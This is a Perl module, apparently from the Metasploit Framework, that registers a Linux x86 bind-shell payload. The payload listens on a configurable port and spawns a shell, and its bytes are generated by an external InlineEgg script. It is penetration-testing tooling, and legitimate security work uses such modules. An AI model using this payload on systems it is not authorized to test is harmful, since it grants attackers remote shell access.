package Msf::Payload::linx86_bind_ie;
use strict;
use base 'Msf::ExternalPayload';

my $info =
{
    Name         => 'linx86bind_ie',
    Version      => '1.0',
    Description  => 'Listen for connection and spawn a shell',
    Author       => 'gera[at]corest.com [InlineEgg License]',
    Arch         => [ 'x86' ],
    Priv         => 0,
    OS           => [ 'linux' ],
    Keys         => '', 
    Multistage   => 0,
    Type         => 'bind_shell',
    Size         => 0,
    UserOpts     =>
        {
            'LPORT' => [1, 'PORT', 'Listening port for bind shell'],
        }
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    $self->{'Filename'} = $self->ScriptBase . '/payloads/external/linx86bind_ie.py';
    $self->{'Info'}->{'Size'} = $self->_GenSize;
    return($self);
}

sub _GenSize
{
    my $self = shift;
    my $bin = $self->Generate({'LPORT' => '4444',});
    return length($bin);
}
